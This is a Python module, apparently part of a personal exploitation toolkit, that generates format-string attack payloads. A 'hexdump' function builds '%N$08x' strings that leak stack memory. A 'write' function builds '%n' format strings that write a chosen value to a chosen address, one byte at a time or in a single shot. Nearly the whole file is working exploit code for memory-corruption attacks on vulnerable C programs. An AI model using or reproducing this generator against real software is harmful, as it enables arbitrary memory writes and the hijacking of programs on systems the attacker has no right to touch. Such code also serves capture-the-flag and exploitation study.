#!/bin/python3


from payload import *


def hexdump(nb, start=1, sep="-"):
    payload = b""
    for i in range(nb):
        payload += str.encode("%" + str(start) + "$08x" + sep)
        start += 1
    return payload


#
# formatstr.write : This function will generate a format string to store
# `value' at the `addr'. The location at `ptr_offset' will store the addr
# The `n_chars_before' must be considered, as it's a format string, `value'
# depends of the string size. `n_chars_before' is the number of chars printed
# by the printf (or equivalent).
#
# Without optimizations, the output looks like this :
#
#    addr1 + addr2 + addr3 + addr4 + 4 * "%<PADDING>.0s%`ptr_offset'$n"
#
# - addrX : address to write one byte
# - "%<PADDING>.0s" : print PADDING spaces, the address is not important
# - "%`ptr_offset'$n" : count nb characters before and save at ptr_offset
#
# Otherwise with optimizations :
#
# if `value' <= 13       addr + "CCC..." + %`ptr_offset'$n
# if `value' < 65536     addr + "%<PADDING>.0s$`ptr_offset'$n"
#
def write(addr, value, n_chars_before, ptr_offset):
    def info_fmtstr(chars):
        info("formatstr.write string length %s (printf generates %d chars)" %
                (str(len(payload)), chars))

    if ptr_offset < 1:
        die("ptr_offset < 1")

    payload = b""

    curr_n = value - n_chars_before - NB_BYTES_ADDR

    # If curr_n is negative it means that we have a small value compared to
    # the number of [already] chars generated before.
    # So we will consider this value as a four bytes value (for 32b).
    if curr_n >= 0:
        # Optimizations : format string smallest as possible

        if curr_n <= 9:
            payload += set32(addr)
            payload += str.encode("C" * curr_n)
            payload += str.encode("%" + str(ptr_offset) + "$n")
            info_fmtstr(curr_n)
            return payload

        if curr_n < 65536:
            payload += set32(addr)
            payload += str.encode("%" + str(curr_n) + ".0s")
            payload += str.encode("%" + str(ptr_offset) + "$n")
            info_fmtstr(curr_n)
            return payload

    # Without previous optimizations, generic way : write value byte per byte

    by = int_to_bytes(value, NB_BYTES_ADDR) 

    # Save addresses at the beginning of the format string
    for i in enumerate(list(reversed(by))):
        payload += set32(addr)
        addr += 1
     
    curr_n = n_chars_before + 4 * NB_BYTES_ADDR

    # Compute offset for each bytes
    # for each sub value of value : %<PADDING>.0s%`ptr_offset'$n
    for (k, i) in enumerate(by):
        if i >= curr_n:
            payload += str.encode("%" + str(i - curr_n) + ".0s")
            payload += str.encode("%" + str(ptr_offset) + "$n")
            curr_n = i
        else:
            # Every value must increase, so we add a 0x0100
            # It will be erased by the left byte. On the last byte,
            # the 0x01 will be outside our final value
            new = i
            while new < curr_n:
                new += 0x0100
            payload += str.encode("%" + str(new - curr_n) + ".0s")
            payload += str.encode("%" + str(ptr_offset) + "$n")
            curr_n = new

        ptr_offset += 1

    info_fmtstr(curr_n)

    return payload


